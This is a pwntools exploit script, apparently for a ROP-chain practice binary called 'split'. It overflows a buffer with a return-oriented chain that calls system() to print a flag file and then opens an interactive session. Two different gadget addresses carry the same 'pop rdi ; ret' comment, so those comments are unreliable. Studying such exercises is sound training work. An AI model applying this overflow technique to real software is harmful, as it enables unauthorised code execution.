#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./split')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("> ")

payload = (
    b"A" * 40 +
    p64(0x400884) + #  : pop rdi ; ret
    p64(0x400883) + #  : pop rdi ; ret
    p64(0x601060) + # /bin/cat flag.txt
    p64(exe.plt["system"])
)
io.sendline(payload)

io.interactive()

